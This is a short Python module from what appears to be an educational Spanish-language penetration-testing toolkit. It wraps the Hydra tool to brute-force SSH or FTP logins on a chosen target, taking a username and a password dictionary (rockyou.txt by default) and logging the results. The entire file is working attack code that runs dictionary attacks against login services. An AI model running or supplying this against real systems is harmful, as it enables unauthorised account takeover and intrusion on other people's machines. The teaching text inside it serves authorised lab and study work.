"""Wrapper de Hydra: fuerza bruta sobre SSH/FTP."""
import os
import shutil
from colorama import Fore, Style

from ..ui import edu_print
from ..runner import run_cmd


def run_hydra_bruteforce(target, workspace_dir):
    if shutil.which('hydra') is None:
        print(f"{Fore.RED}[!] Hydra no está instalado. (sudo apt install hydra)")
        return

    print(f"\n{Fore.GREEN}[*] Inicializando Suite HYDRA contra {target}{Style.RESET_ALL}")
    service = input(f"{Fore.CYAN}[?] ¿Qué servicio deseas atacar? (Opciones: ssh, ftp): ").strip().lower()

    if service not in ['ssh', 'ftp']:
        print(f"{Fore.RED}[!] Por ahora este script educacional solo soporta ssh o ftp.")
        return

    user = input(f"{Fore.CYAN}[?] Introduce el nombre del usuario a brute-forcear (Ej: root, admin): ").strip()
    wordlist = input(f"{Fore.CYAN}[?] Ruta del diccionario de contraseñas (Enter para /usr/share/wordlists/rockyou.txt): ").strip()
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"

    if not os.path.exists(wordlist):
        print(f"{Fore.RED}[!] No se encontró el diccionario: {wordlist}")
        return

    edu_print(
        tool="Hydra",
        phase=f"Explotación Activa (Ataque de Diccionario {service.upper()})",
        explanation=f"- 'hydra -l {user} -P {wordlist} {service}://{target}':\n"
                    f"- Ataca validaciones de login enviando cientos de contraseñas por minuto.\n"
                    f"- El servicio {service.upper()} debe estar primero abierto (comprobado vía Nmap)."
    )

    log_file = os.path.join(workspace_dir, "exploits", f"hydra_{service}_bruteforce.txt")
    run_cmd(['hydra', '-l', user, '-P', wordlist, f"{service}://{target}"],
            capture_output=True, log_file=log_file)
